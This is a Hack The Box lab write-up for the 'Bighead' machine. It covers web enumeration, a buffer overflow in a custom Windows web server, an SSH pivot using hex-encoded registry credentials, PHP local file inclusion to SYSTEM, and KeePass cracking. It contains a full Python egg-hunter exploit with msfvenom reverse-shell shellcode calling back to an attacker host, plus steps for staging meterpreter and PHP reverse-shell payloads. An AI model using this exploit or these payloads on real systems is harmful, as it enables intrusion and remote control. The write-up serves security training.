Name: Ben Roudebush

Lab: HTB - Bighead

IP Address: 10.129.229.241 // 10.129.229.243

Date: 11 October 2022

## High Level Summary

Bighead is a sprawling Windows web server. Bighead is difficult in that infuriating way where the challenge isn't inherent to any of the tasks required, but rather arises out of the fragility of the foothold and fact that getting user required me to figure out how to get an instance of Windows Server 2008 working in 2022. I stand by the fact that the only thing this box taught me is that 1% of my final grade really is not worth this much effort. The box starts out with about 3 hours of web enumeration. At which point, the attacker, if they aren't asleep by now, will find that there is a custom web server running on the machine. This web server, it turns out, is vulnerable to a buffer overflow which nets the initial foothold shell. The machine still does not yield a flag; however, despite the fact you've likely spent 6 hours between enumeration and troubleshooting end-of-life Windows OS. The creator of this box thinks of themselves as better than other people, so not just one, but *both* flags are the *totally funny and not overused* fake flags. To escalate privileges, the attacker must notice that an SSH service is listening locally on port 2020. This port can be forwarded in a number of ways. Combined with a password sort of obfuscated in the Registry, we can log in and finally get the user flag... right? No. You SSH in as `nginx` and find yourself in a restricted shell. From there, the attacker must find the source code to one of the many web pages. The source leaks that it is vulnerable to a LFI vulnerability, which just straight-up nets a shell as `SYSTEM` where finally, the user flag can be obtained. The root flag is further obfuscated of course, so the attacker must crack a hidden KeePass file to obtain the flag. From start to finish, Bighead took me thirteen and a half hours, 5:00 PM on 10th November to 6:30 AM on 11th November, so I apologize if the writeup quality is... subpar. I did not plan to spend this long fighting with this box.

## Service Enumeration

### Nmap

![](../HTB-pics/bighead/01.png)

Nmap might be the only simple thing about this box, returning just HTTP. It's not even obvious yet what operating system the target is.

### Web Enumeration

Due to the overwhelming quantity of web enumeration on this box, I will be placing pictures a bit out of order in the hopes to form an easier-to-understand report.

#### 10.129.229.241

With just the IP, a web visit yields a simple website.

![](../HTB-pics/bighead/02.png)

The bottom of the page leaks a possible `bachmanity.htb` as a domain in the contact information. I also decided to test the contact form to see if anything interesting came back.

![](../HTB-pics/bighead/03.png)

Submitting the form gives this error page because my computer doesn't know where `mailer.bighead.htb` is.

![](../HTB-pics/bighead/04.png)

Now is a good time to add some domains to my `/etc/hosts` file. I add `mailer.bighead.htb` from the contact form, `bachmanity.htb` from the footer information, and `bighead.htb` because it's the name of the lab.

![](../HTB-pics/bighead/05.png)

#### `mailer.bighead.htb`

This site returns nothing of interest. Just a confirmation that my message was "sent".

![](../HTB-pics/bighead/06.png)

#### `bachmanity.htb`

Bachmanity returns similarly little to Mailer. The page is a singular static image of generic business-y stuff.

![](../HTB-pics/bighead/06a.png)

#### `code.bighead.htb` & `dev.bighead.htb`

At this point, I've realized it might be useful to try to find yet more host names. To do this, I'll use `wfuzz` along with a wordlist of common host names. `wfuzz` finds `code` and `dev` as valid host names, along with the `mailer` we already knew of.

![](../HTB-pics/bighead/12.png)

I add these to my `/etc/hosts` too.

![](../HTB-pics/bighead/13.png)

Trying to visit `code.bighead.htb` redirects me to `127.0.0.1:5080/testlink/login.php`, which obviously returns an error since my localhost doesn't have anything listening on port 5080.

![](../HTB-pics/bighead/14.png)

I can go into Burpsuite to intercept this request. I change the `Host:` header back to `code.bighead.htb`.

![](../HTB-pics/bighead/15.png)

If I forward this request, I get a ton of SQL errors. The file paths also give me definitive proof that this is Windows.  I will have to stow this page away for now, as it doesn't provide much use with the amount of (or lack thereof) information I have.

![](../HTB-pics/bighead/16.png)

`dev.bighead.htb` is another static image. Neat.

![](../HTB-pics/bighead/17.png)

#### Directory Enumeration

Fuzzing for directories on each of these hosts gives a ton of "valid" results. In reality, most of these are similar. For example, most of the results on `mailer.bighead.htb` have `index` somewhere in the string. If I stumble on something interesting in these lists, I'll point them out then.

![](../HTB-pics/bighead/11.png)

##### `dev.bighead.htb`

When my `gobuster` scan on `dev.bighead.htb` returns the same un-useful mess as the rest of the hosts, but hidden among them is something unusual. An error core 418.

![](../HTB-pics/bighead/18.png)
![](../HTB-pics/bighead/32.png)

Visiting `dev.bighead.htb/coffee` gives a strange gif of a teapot pouring tea into a cup along with a silly error message.

![](../HTB-pics/bighead/19.png)

If I intercept this request in Burpsuite, I find something even weirder. In the `Server: ` header where you'd normally see `nginx`, `Apache`, etc., there is `BigheadWebSvr 1.0`, which is definitely a piece of custom code.

![](../HTB-pics/bighead/20.png)

##### `code.bighead.htb`

Even though I have a good idea of where to look next, I should finish looking through all the directory enumeration results. `code.bighead.htb` had a `/mail` directory that I thought would be interesting. It returns an empty directory listing.

![](../HTB-pics/bighead/33.png)

If I intercept this request in Burp, I can see something very strange.

![](../HTB-pics/bighead/34.png)

The page says Apache, but the header says nginx. Along with whatever BigheadWebSvr is, that's three different servers on the same machine. No wonder web enumeration has been such a pain. The gobuster results also show a `/phpmyadmin`, which is interesting for a number of reasons.

![](../HTB-pics/bighead/35.png)

#### PHPMyAdmin Enumeration

Using `gobuster`, I can actually look for more than just directories. Here, I'll use it to look for common PHP files. 

![](../HTB-pics/bighead/36.png)

Unfortunately, most of the files are of size 1. At least, I can look at `phpinfo.php`.

![](../HTB-pics/bighead/37.png)

The file says that the system is Windows Server 2008, which has been out of support for a long time. So long that modern operating systems can't really interface with it. That means, we might have to spin up a VM to go anywhere. Ugh.

## Initial Foothold

### Decompiling `BigheadWebSvr`

#### Actually Getting a Copy of the Executable

Looking online for information about this server yields a GitHub repo by this box's creator with a couple commits.

![](../HTB-pics/bighead/21.png)

I can clone the one archive file, but when I try to unzip it, I get an error.

![](../HTB-pics/bighead/22.png)

Turns out, I need a password to unzip this file. Lucky for me, `zip2john` exists. I convert the file into `john`'s format.

![](../HTB-pics/bighead/23.png)

Then, I use `john` to crack the password to `thepiedpiper89`.

![](../HTB-pics/bighead/24.png)

I can finally unzip the archive with `7z`, yielding one directory.

![](../HTB-pics/bighead/25.png)

The only thing present in the folder other than some largely uninteresting conf files is a notice by what I presume to be one of the "developers" at this organization that claims to have removed the "vulnerable crapware" from the git repository.

![](../HTB-pics/bighead/26.png)

However, as anyone who's accidentally committed their SSH secret ley is well aware, Git history is resilient. I can just go to the previous commit, download *that* archive and hope the executable is in that archive. I rename the archive with the notice in it to not have conflicting names and download the slightly older archive from Git.

![](../HTB-pics/bighead/27.png)

The same password surprisingly does not work to open the older archive, so I have to repeat the `john` process.

![](../HTB-pics/bighead/28.png)

This hash is really really long, so I do some tidying and then use `wc` to make sure it's still huge.

![](../HTB-pics/bighead/29.png)

Then, I again use `john` to crack the password. This time, it's `bighead`.

![](../HTB-pics/bighead/30.png)

Finally, I have a copy of the executable.

![](../HTB-pics/bighead/31.png)


#### Analysis in `ida`

A great tool for disassembling programs like this is `ida` because I can run it from Linux and avoid dealing with Windows for as long as possible.

![](../HTB-pics/bighead/38.png)

Once I open the executable in `ida`, I get this view. `ida` will display the assembly in a flowchart-eske format, as you can see by the map in the bottom corner of the screen. When the program opens, we're focused on `_main`.

![](../HTB-pics/bighead/39.png)

A good place to start here would be the function that handles requests. That's how I, as an external user, can interface with the server, so it's probably where the vulnerability lies. There's a number of ways to find this function, but in my opinion, the simplest is by opening the strings view and finding the section that handles getting the teapot image. That's shown here.

![](../HTB-pics/bighead/40.png)

Clicking on `GET /coffee` brings me to that line in the actual program.

![](../HTB-pics/bighead/41.png)

Then, when I click on the `aGetCoffee` function, I get the one line that handles this request: `ConnectionHandler(x)`. Those observant ones among you will notice that I could have just found this function in the sidebar, but these functions may not always be named so idiomatically.

![](../HTB-pics/bighead/42.png)

Clicking the `ConnectionHandler(x)` in the sidebar brings me to this general area. This is the part of the program we're most concerned with. It's hard to see

![](../HTb-pics/bighead/47.png)

Essentially what's going on here is a function that converts a string into byte pairs. The part on the far left repeats, converting a pair at a time into bytes, until the loop is finished, at which point, the large block to the right executes. That block calls another function called `_Function4`, which is the unsafe part of this application.

The part that loops, converting the value to bytes:

![](../HTB-pics/bighead/48.png)

The part that executes after the loop finishes and calls `_Function4`:

![](../HTB-pics/bighead/49.png)

`_Function4` itself:

![](../HTB-pics/bighead/50.png)

The reason the above code is unsafe is because it does a `strcopy` from a buffer that is controlled by user input and puts that onto the stack directly. This allows the value to overwrite other contents of memory and what allows for a buffer overflow to be carried out.


### Determining Buffer Overflow

#### Getting Windows Server 2008 Set Up

Now getting this legacy software running was by far the most tedious part of an already tedious activity. As you can see, I've got a Windows Server 2008 VM up in VM Workstation Player.

![](../HTb-pics/bighead/51.png)

After fighting with the security features to get Google Chrome on this thing, I had an issue with SSL certs. Turns out, something with the way dates work in this older version of Windows gets messed up and it thinks that the clock is ahead despite it literally being synced to `time.microsoft.com`. Either way, I used some trial and error to find a date range that correctly evaluated the SSL certs. This ended up being around November 2016, beats me. Either way, page styles were still not loading for me, so every page was rendered in beautiful, glorious pure HTML. Nevertheless, I managed to navigate to the Github repo and download the `BHWS_Backup` file on Windows.

![](../HTB-pics/bighead/52.png)

When I try to start the server, I get an error. Turns out that old software libraries for out-of-service Windows versions aren't still supposed? What a shock.

![](../HTB-pics/bighead/53.png)

In order to get this library, I had to download the MinGW Installation Manager. Then, I can find the library I need, the `.DLL`, not `.DEV`, file.

![](../HTB-pics/bighead/54.png)

I click the tickbox and select it for installation. Then I can install it by the `Installation` menu. Now, because Windows' path system has to be needlessly obtuse, I can't just add this library's folder to my path. It jsut doesn't work. I can, however, just plonk that library in the same folder as the web server.

![](../HTB-pics/bighead/56.png)

I finally have the server working.

![](../HTB-pics/bighead/57.png)

I also make sure to download and install Immunity Debugger (like `gdb`, but for Windows and infinitely less convenient). I also grab the `mona` GitHub repo. Mona will help us later when we go about crafting our exploit.

![](../HTB-pics/bighead/58.png)

I copy the `mona.py` file and paste it into this folder so that Immunity Debugger can use it.

![](../HTB-pics/bighead/59.png)

The last setup task I need to do is make sure both my Kali and Windows VMs are using the Bridged network type so they can communicate.

![](../HTB-pics/bighead/60.png)

I can hit the page from Kali, finally.

![](../HTB-pics/bighead/61.png)

#### Finding Some Memory Addresses

Finally, I can actually start enumerating this program. In Immunity Debugger, I'll want to go to the file menu to attach to (or just run with Immunity Debugger) the BigheadWebSvr process.

![](../HTB-pics/bighead/62.png)

Once I start the program and see "Running" in the bottom-right corner of the screen, I can create a pattern with `msf-pattern_create` to determine the exact position at which the buffer overflow occurs.

![](../HTB-pics/bighead/64.png)

If I then curl against my Windows machine from Kali, supplying that value as a file path, I will get the "Access violation" notification on Windows. This is good!

![](../HTB-pics/bighead/65.png)

It tells me where the violation occurred. If I feed that value back into `msf-pattern`, I see that the overflow occurred at offset 36. (meaning that, due to the weird nature of the function here, there are 72 characters before the overflow).

![](../HTB-pics/bighead/66.png)

The specifics here get a little confusing, but the jist of it is that the space of memory I can overwrite here isn't big enough to store a reverse shell. So, to get a reverse shell payload in memory, I have to do what's called egg hunting. Essentially, I put the shellcode somewhere else in memory and mark it with a string, called an "egg", Then a smaller program, small enough to fit in the compressed space I have to work with, called an "egg hunter" goes and finds the marker I left and then executes whatever comes after that. I need the location of some memory addresses to do that. I'll use `!mona jump -r ESP` to find JMP-ESP.

![](../HTB-pics/bighead/67.png)
![](../HTB-pics/bighead/68.png)

If I take that address and tack it onto the end of 72 "A"s (in reverse order because of first-in-last-out) and then curl that string against my server, I jump to that memory address. This is where my egg hunter will go.

![](../HTB-pics/bighead/69.png)
![](../HTB-pics/bighead/70.png)

Then I can use `!mona egg -t valo` to generate a tiny program that finds "valovalo" somewhere in memory.

![](../HTB-pics/bighead/71.png)

Next, I'll need some shellcode to execute. I'll use msfvenom to generate it.

![](../HTB-pics/bighead/72.png)

I also set a listener to catch my shell.

![](../HTb-pics/bighead/73.png)

Here is the python code I used to perform this exploit.

```python
#!/usr/bin/python
import socket
import binascii
import re

host = '10.129.229.241' # IP of the target
port = 80 # Port open on the target
egg = 'valo' # string used as the 'egg'

# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=42069 -b '\x00' -f python
buf =  ''
buf += 'be62962325dbc3d97424f45f2b'
buf += 'c9b15283c70431770e031598c1'
buf += 'd0254c871bd58de89230bc28c0'
buf += '31ef9882171c52c6839716cfa4'
buf += '109c298ba18d0a8a21cc5e6c1b'
buf += '1f936d5c425e3f3508cdaf3244'
buf += 'ce44084856b9d96b776c513257'
buf += '8fb64ede97db6ba82c2f072be4'
buf += '61e880c94d1bd80e69c4af6689'
buf += '79a8bdf3a53d25532de58165e2'
buf += '7042694ff60c6e4edb278adbda'
buf += 'e71a9ff823467b6072222a9d64'
buf += '8d933bef20c731b22c24784cad'
buf += '220b3f9feda7d793666e20d35c'
buf += 'd6be2a5f2797e80b778fd9331c'
buf += '4fe5e1b31f495a74cf290a1c05'
buf += 'a6753c266c1ed7dde72b22d3f9'
buf += '4330eba1c1bd0dc3f9eb867c63'
buf += 'b65c1c6c6c191ee683ded10fe9'
buf += 'cc86ffa4ae01ff12c6ce92f816'
buf += '988e5641cd61af07e3d81935fe'
buf += 'bd62fd257e6cfca83a4aee74c2'
buf += 'd65a299580348f4f63ee59232d'
buf += '661f0feef0205a981c9033dd23'
buf += '1dd4e95c434415b7c7745c956e'
buf += '1d394c3340babb707d3949097a'
buf += '21380cc6e5d17c5780d5d35881'

# Put the egg before the shellcode so that the gunter can find it.
shellcode = (egg * 2) + binascii.unhexlify(buf)

# Generated from !mona egg -t valo
egghunter = '6681caff0f42526a0258cd2e3c055a74efb8' + binascii.hexlify(egg) + '8bfaaf75eaaf75e7ffe7'

# Send the shell code many times so that the gunter has a better chance of finding it
def send_shellcode(host,port,egg,shellcode):
        print '\033[32m [*] Sending Shellcode'
        for i in range(0,4):
                thighhigh = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
                thighhigh.connect((host,port))
                thighhigh.send('POST / HTTP/1.1\r\n')
                thighhigh.send('Host: dev.bighead.htb\r\n')
                thighhigh.send('Content-Length: %s\r\n'%len(shellcode))
                thighhigh.send('\r\n')
                thighhigh.send(shellcode+'\r\n')
                thighhigh.send('\r\n')
                print '\033[34m' + '[' + str(i) + '] ' + re.sub(r'\s',' ',thighhigh.recv(12))
                thighhigh.close()
        print '\033[32m [*] Done'

# Send the gunter
def send_egghunter(host,port,egghunter):
        print '\033[32m [*] Sending EggHunter'
        thighhigh = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
        thighhigh.connect((host,port))
        thighhigh.settimeout(None)
        thighhigh.send('HEAD /' + ('V'*72) + 'f0125062' + egghunter + ' HTTP/1.1\r\n')
        thighhigh.send('Host: dev.bighead.htb\r\n')
        thighhigh.send('\r\n')
        print '\033[34m' + re.sub(r'\s',' ',thighhigh.recv(12))
        thighhigh.close()
        print '\033[32m [*] Done'

send_shellcode(host,port,egg,shellcode)
send_egghunter(host,port,egghunter)
```

I've tried to explain the code to the best of my ability in comments. This involves a lot of trial and error to find something that worked. When I execute the script, I have to wait a while and try a few times, but I do get a shell.

![](../HTB-pics/bighead/74.png)
![](../HTB-pics/bighead/75.png)

### Local SSH & Stored Credentials, Pivot to `nginx`

I'd love to say "And then I just read the user file and moved on to going for the root flag!", but alas, it is not that simple. Even those I've already used the second most words of any of my reports, we still have a while to go. Once on the box, we can find that port 2020 is open on localhost.

![](../HTB-pics/bighead/76.png)

This port corresponds to an SSH server.

![](../HTB-pics/bighead/77.png)

This makes me want to look for passwords to try and log in by exposing SSH externally. Luckily, `nelson` can query `HKEY LOCAL MACHINE`.

![](../HTB-pics/bighead/78.png)

There are some long hex-apparent strings in the Registry Keys for `nginx`.

![](../HTB-pics/bighead/79.png)

The box creator gives me a middle finger.

![](../HTB-pics/bighead/80.png)

But, if I query that key again, I can see another long string.

![](../HTB-pics/bighead/81.png)

If I hex-decode this string, I get a wonky-looking string that I will hold onto for later.

![](../HTB-pics/bighead/82.png)

Moving back to SSH for a moment, there are a couple of ways we could go about exposing SSH externally. The easiest and stablest way in my opinion, is to use meterpreter. I'll use `msfvenom` to make another payload, this time in .EXE format.

![](../HTB-pics/bighead/83.png)

I then start a python SMB server on Kali in the directory where I placed that payload so that I can download it on the target.

![](../HTB-pics/bighead/84.png)

I also make sure to start a handler for the payload to hit against.

![](../HTB-pics/bighead/85.png)

Then, I download the file on the target and run it.

![](../HTB-pics/bighead/86.png)

I get a meterpreter shell on the listener, where I can forward SSH to the outside of the box.

![](../HTB-pics/bighead/87.png)

Finally, I can log in as `nginx` and use that string from earlier as the password.

![](../HTB-pics/bighead/88.png)

### LFI, Pivot to `SYSTEM`

But guess what?? We're *still not* at the user flag. You may notice that my shell looks a little strange. It turns out, I'm in a restricted environment. I do seem to be in the web directory though.

![](../HTB-pics/bighead/89.png)

If I look at these files, `linkto.php` is the most-recently edited file by quite a margin. The file has some very interesting contents.

![](../HTB-pics/bighead/91.png)

A variable that is used in a `require_once()` block is supplied by a POST parameter. That means, I can provide the path of any file on the system and it will be executed with this file is. Naturally, I grab a Windows PHP reverse shell.

![](../HTB-pics/bighead/93.png)

Then I set up the python SMB server again.

![](../HTB-pics/bighead/94.png)

I copy the file to my previously-used working directory.

![](../HTB-pics/bighead/95.png)

Then, I curl the page, setting the variable that gets passed to `require_once()` to my reverse shell.

![](../HTB-pics/bighead/96.png)

And *finally*, I get a shell and the user flag. I'm even `SYSTEM`.

![](../HTB-pics/bighead/97.png)

## Privilege Escalation

### Finding the Root Flag in a Hidden KeePass DB

If I try to read the root flag, I get another false flag.

![](../HTB-pics/bighead/98.png)

I've seen KeePass pop up a couple times in my enumeration. In the KeePass config file, apparently, there is a KeePass database hidden in the root flag.

![](../HTB-pics/bighead/99.png)
![](../HTB-pics/bighead/99-00.png)

Normally, getting this type of file off of Windows intact would be a pain, but for once the box creator throws us a bone by putting `bash.exe` on the bopx

![](../HTB-pics/bighead/99-01.png)

I'll use `keepass2john` to turn the database into a crackable hash.

![](../HTB-pics/bighead/99-02.png)

`john` cracks it very swiftly.

![](../HTB-pics/bighead/99-03.png)

And within the database, there sits the root flag.

![](../HTB-pics/bighead/99-04.png)

## Recommendations

- Loose web controls
	- The many web pages and directories were able to be fuzzed without ever being rate-limited or locked out.
	- It is my recommendation that a control be put in place to limit the number of requests that can be made by one source.
	- The PHPMyAdmin was also exposed to unauthenticated users.
	- It is my recommendation that this be locked to only authenticated users.
- Poorly-coded custom applications
	- The custom web server used was vulnerable to a buffer overflow attack
	- It is my recommendation that one of the other officially-supported implementation used elsewhere in this environment be used instead (`nginx`/`Apache`). There's no need to re-invent the wheel here.
- Shared source code
	- The source code to the custom web server was hosted in a public repository.
	- It is my recommendation that this repository be limited to members of the organization only.
- Legacy code/hardware
	- The server itself was still running Windows Server 2008, which has officially reached end-of-life for a while now. This should be phased out for more modern operating systems.
- Insecurely stored credentials
	- The `nginx` service account's credentials were stored in an easily-reversed format (being hex). Credentials, if stored at all, should be stored in a hashed format that is difficult to reverse.
	- I recognize that the `nginx` account is in a limited shell environment, but this method of credential storage is still unwise.
- Local File Inclusion
	- The implementation of PiperCoin allows a user to specify any local file to be evaluated simply by passing its path as a parameter
	- The fix for this can be as simple as making sure the value supplied is one of a set list of allowed values instead of allowing any value to be provided.
- Weak Passwords
	- The password used for the password bank, "darkness" is not strong enough to adequately prevent the compromise of these passwords. It should be lengthened to increase the work-factor required to crack it.